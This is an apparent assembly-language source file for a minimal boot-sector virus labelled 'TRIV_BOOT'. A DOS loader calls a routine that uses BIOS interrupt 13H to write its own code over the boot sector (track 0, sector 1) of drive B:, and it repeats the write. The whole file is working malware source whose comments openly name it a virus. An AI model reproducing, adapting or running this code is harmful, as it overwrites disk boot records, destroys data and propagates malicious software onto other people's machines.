.model  small 
.code 
 
        ORG     100H 
 
START:  call    TRIV_BOOT               ;loader just calls the virus
        ret                             ;and exits to DOS
 
        ORG     7C00H 
 
TRIV_BOOT: 
        mov     ax,0301H                ;write one sector
        mov     bx,7C00H                ;from here 
        mov     cx,1                    ;to Track 0, Sector 1, Head 0
        mov     dx,1                    ;on the B: drive
        int     13H                     ;do it 
        mov     ax,0301H                ;do it again to make sure it works
        int     13H 
        ret                             ;and halt the system
 
        END     START 
